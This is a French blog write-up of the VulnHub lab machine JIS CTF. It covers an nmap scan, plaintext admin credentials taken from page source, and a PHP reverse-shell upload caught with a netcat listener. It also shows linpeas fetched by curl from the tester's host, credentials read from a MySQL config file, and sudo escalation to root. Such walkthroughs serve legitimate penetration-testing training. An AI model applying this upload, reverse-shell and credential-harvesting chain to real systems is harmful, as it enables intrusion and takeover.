---
layout: post
title: VulnHub - JIS CTF
subtitle: VulnHub - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [VulnHub, Linux, PHP, upload]
comments: false
---

![Logo](/img/Vulnhub_logo.png){: .center-block :}

JIS CTF est une machine vulnérable créée par Mohammad Khreesha et disponible depuis mars 2018 en téléchargement sur [VulnHub](https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/). Elle est également proposée sur la plateforme d'[Offensive Security](https://www.offensive-security.com/labs/individual/).

## 1. User

Nmap:

~~~
root@Host-001:~/Bureau/OSCP_Box/JISCTF# nmap -sC -sV 192.168.110.25
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-14 11:25 CET
Nmap scan report for 192.168.110.25
Host is up (0.096s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.48 seconds
root@Host-001:~/Bureau/OSCP_Box/JISCTF# 
~~~

Les ports http (80) et ssh (22) sont ouverts.

Port 80:

![Logo](/img/JIS_1.png){: .center-block :}

Robots.txt:

![Logo](/img/JIS_2.png){: .center-block :}

Plusieurs dossiers sont accessibles:

![Logo](/img/JIS_3.png){: .center-block :}

![Logo](/img/JIS_4.png){: .center-block :}

![Logo](/img/JIS_5.png){: .center-block :}

On trouve des identifiants dans le code source de /admin_area

![Logo](/img/JIS_6.png){: .center-block :}

On peut se loguer avec ces credentials `admin::3vil_H@ck3r`

On tombe sur une interface d'upload

On upload le reverse shell de Pentest Monkey (pentestmonkey.php) apres avoir entré la bonne adresse IP

On ouvre un listener et on visite la page http://192.168.110.25/uploaded_files/pentestmonkey.php

On a un shell

~~~
root@Host-001:~/Bureau/OSCP_Box/JISCTF# nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.49.110] from (UNKNOWN) [192.168.110.25] 59566
Linux Jordaninfosec-CTF01 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:44:49 up 24 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c "import pty; pty.spawn('/bin/bash')"
/bin/sh: 2: python: not found
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@Jordaninfosec-CTF01:/$ cd /home
cd /home
www-data@Jordaninfosec-CTF01:/home$ ls
ls
technawi
www-data@Jordaninfosec-CTF01:/home$ 
www-data@Jordaninfosec-CTF01:/home$ cd technawi
cd technawi
www-data@Jordaninfosec-CTF01:/home/technawi$ ls -la
ls -la
total 44
drwxr-xr-x 3 technawi technawi 4096 Jul  9 16:01 .
drwxr-xr-x 3 root     root     4096 Apr 11  2017 ..
-rw------- 1 technawi technawi    0 Jul 13 20:43 .bash_history
-rw-r--r-- 1 technawi technawi  220 Apr 11  2017 .bash_logout
-rw-r--r-- 1 technawi technawi 3771 Apr 11  2017 .bashrc
drwx------ 2 technawi technawi 4096 Apr 11  2017 .cache
-rw-r--r-- 1 technawi technawi  655 Apr 11  2017 .profile
-rw-r--r-- 1 technawi technawi    0 Apr 11  2017 .sudo_as_admin_successful
-rw------- 1 root     root     6666 Apr 21  2017 .viminfo
-rw-r--r-- 1 root     root     7141 Apr 18  2017 1
-rw-r--r-- 1 technawi technawi   33 Nov 14 12:24 local.txt
www-data@Jordaninfosec-CTF01:/home/technawi$ cat local.txt
cat local.txt
9fd49493572648e79c171508eab43cf3
www-data@Jordaninfosec-CTF01:/home/technawi$ 
~~~

## 2-Root

uploader linpeas sur la cible

~~~
www-data@Jordaninfosec-CTF01:/tmp$ curl http://192.168.49.110/linpeas.sh --output linpeas.sh
<1:/tmp$ curl http://192.168.49.110/linpeas.sh --output linpeas.sh           
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  290k  100  290k    0     0   485k      0 --:--:-- --:--:-- --:--:--  485k
www-data@Jordaninfosec-CTF01:/tmp$ ls -la
ls -la
total 328
drwxrwxrwt  9 root     root       4096 Nov 14 12:50 .
drwxr-xr-x 23 root     root       4096 Feb 14  2020 ..
drwxrwxrwt  2 root     root       4096 Jul 17 22:33 .ICE-unix
drwxrwxrwt  2 root     root       4096 Jul 17 22:33 .Test-unix
drwxrwxrwt  2 root     root       4096 Jul 17 22:33 .X11-unix
drwxrwxrwt  2 root     root       4096 Jul 17 22:33 .XIM-unix
drwxrwxrwt  2 root     root       4096 Jul 17 22:33 .font-unix
-rw-rw-rw-  1 www-data www-data 297851 Nov 14 12:50 linpeas.sh
drwx------  3 root     root       4096 Jul 17 22:33 systemd-private-868bc21fcfc74ebdbaf7a9d0f66ea02b-systemd-timesyncd.service-dw7UVM
drwx------  2 root     root       4096 Jul 17 22:33 vmware-root
www-data@Jordaninfosec-CTF01:/tmp$ chmod +700 linpeas.sh
chmod +700 linpeas.sh
www-data@Jordaninfosec-CTF01:/tmp$ 
~~~

lancer linpeas

on trouve un mdp

![Logo](/img/JIS_7.png){: .center-block :}

~~~
www-data@Jordaninfosec-CTF01:/tmp$ cat /etc/mysql/conf.d/credentials.txt
cat /etc/mysql/conf.d/credentials.txt
Your flag is in another file...

username : technawi
password : 3vilH@ksor
www-data@Jordaninfosec-CTF01:/tmp$ 
www-data@Jordaninfosec-CTF01:/tmp$ su technawi
su technawi
Password: 3vilH@ksor

technawi@Jordaninfosec-CTF01:/tmp$ cd /home/technawi
cd /home/technawi
technawi@Jordaninfosec-CTF01:~$ ls
ls
1  local.txt
technawi@Jordaninfosec-CTF01:~$ sudo -l
sudo -l
[sudo] password for technawi: 3vilH@ksor

Matching Defaults entries for technawi on Jordaninfosec-CTF01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User technawi may run the following commands on Jordaninfosec-CTF01:
    (ALL : ALL) ALL
~~~

(ALL : ALL) ALL -> sudo su ?

~~~
technawi@Jordaninfosec-CTF01:~$ sudo su
sudo su
root@Jordaninfosec-CTF01:/home/technawi# cd /root  
cd /root
root@Jordaninfosec-CTF01:~# ls
ls
proof.txt
root@Jordaninfosec-CTF01:~# cat proof.txt
cat proof.txt
c24ec33ae08353930f60da134dee2ff4
root@Jordaninfosec-CTF01:~# 
~~~

**Poursuivez avec :** 

[- HTB - Admirer](https://0xss0rz.github.io/2020-10-04-HTB-Admirer/)

[- HTB - Magic](https://0xss0rz.github.io/2020-08-24-HTB-Magic/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
